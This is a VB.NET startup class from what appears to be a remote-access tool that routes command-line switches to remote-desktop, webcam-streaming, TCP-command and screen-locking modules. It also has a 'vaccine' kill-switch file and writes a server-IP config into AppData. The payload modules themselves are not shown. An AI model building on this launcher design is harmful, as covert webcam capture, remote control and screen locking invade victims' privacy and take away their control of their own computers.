Public Class Starter
    Public Parametros As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\EquisdeVRS"
    Public StartedData As String
    Public DiagnosticPostingStatus As Boolean = False

    Private Sub Starter_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Try
                StartedData = Format(DateAndTime.TimeOfDay, "hh") & ":" & Format(DateAndTime.TimeOfDay, "mm") & ":" & Format(DateAndTime.TimeOfDay, "ss") & " @ " & DateAndTime.Today
                Console.WriteLine(StartedData)
                Main.Show()
            Catch ex As Exception
                Console.WriteLine("[Starter@Starter_Load(StartedData)]Error: " & ex.Message)
            End Try
            Try
                If My.Computer.FileSystem.FileExists(DIRCommons & "\ThisIsAVaccine.vcn") = True Then
                    Dim TextoArchivoVCN As String = Nothing
                    TextoArchivoVCN = My.Computer.FileSystem.ReadAllText(DIRCommons & "\ThisIsAVaccine.vcn")
                    If TextoArchivoVCN = "Vaccine.vcn /End, /Vaccine, -Equisde(XD;MAIN{CallStack:CloseWithClue} As EndProcess), /FuckItUp, -XD.Stop" Then
                        Console.WriteLine("Vacuna detectada")
                        End
                    Else
                        MsgBox("Vacuna falsa detectada" & vbCrLf & "Casi..., pero no", MsgBoxStyle.Information, "Vaccine System")
                    End If
                End If
            Catch ex As Exception
                Console.WriteLine("[Starter@Starter_Load]Error: " & ex.Message)
            End Try
            Parametros = Microsoft.VisualBasic.Command
            If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
            If Parametros = Nothing Then
                CommonStart()
            ElseIf Parametros = "/TCPCMDReader" Then
                TCPCMDReader.Show()
            ElseIf Parametros = "/TCPCMDRemoteSender" Then
                Try
                    RemoteDesktop.Show()
                Catch ex As Exception
                    Console.WriteLine("[Starter@Starter_Load(/TCPCMDRemoteSender)]Error: " & ex.Message)
                End Try
            ElseIf Parametros = "/TCPCMDVideoSender" Then
                Try
                    WebCamClient.Show()
                Catch ex As Exception
                    Console.WriteLine("[Starter@Starter_Load(/TCPCMDVideoSender)]Error: " & ex.Message)
                End Try
            ElseIf Parametros = "/LockScreen" Then
                Try
                    ScreenLocker.Show()
                Catch ex As Exception
                    Console.WriteLine("[Starter@Starter_Load(/ScreenLockerKeeper)]Error: " & ex.Message)
                End Try
            End If
        Catch ex As Exception
            Console.WriteLine("[Starter@Starter_Load]Error: " & ex.Message)
        End Try
    End Sub

    Sub CommonStart()
        Try
            If My.Computer.FileSystem.FileExists(DIRCommons & "\DataBase.ini") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\DataBase.ini")
            End If
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\DataBase.ini", "#EQUISDE VRS CONFIG DATABASE FILE" &
                                                                       vbCrLf & "ServerIP>" & My.Settings.Me_IP, False)
        Catch ex As Exception
            Console.WriteLine("[Starter@CommonStart(CreateDataBaseFile)]Error: " & ex.Message)
        End Try
        Try
            If My.Computer.FileSystem.FileExists(DIRCommons & "\RemoteXDSender.exe") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\RemoteXDSender.exe")
            End If
        Catch ex As Exception
            Console.WriteLine("[Starter@CommonStart(DeleteRemoteExe)]Error: " & ex.Message)
        End Try
        Try
            If My.Computer.FileSystem.FileExists(DIRCommons & "\VideoXDSender.exe") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\VideoXDSender.exe")
            End If
        Catch ex As Exception
            Console.WriteLine("[Starter@CommonStart(DeleteVideoExe)]Error: " & ex.Message)
        End Try
        Try
            If My.Computer.FileSystem.FileExists(DIRCommons & "\ScreenLockerXDKeep.exe") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\ScreenLockerXDKeep.exe")
            End If
        Catch ex As Exception
            Console.WriteLine("[Starter@CommonStart(DeleteRemoteExe)]Error: " & ex.Message)
        End Try
        Try
            If My.Computer.FileSystem.FileExists(DIRCommons & "\ScreenLockerXDKeep.exe") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\ScreenLockerXDKeep.exe")
            End If
        Catch ex As Exception
            Console.WriteLine("[Starter@CommonStart(DeleteRemoteExe)]Error: " & ex.Message)
        End Try
    End Sub
End Class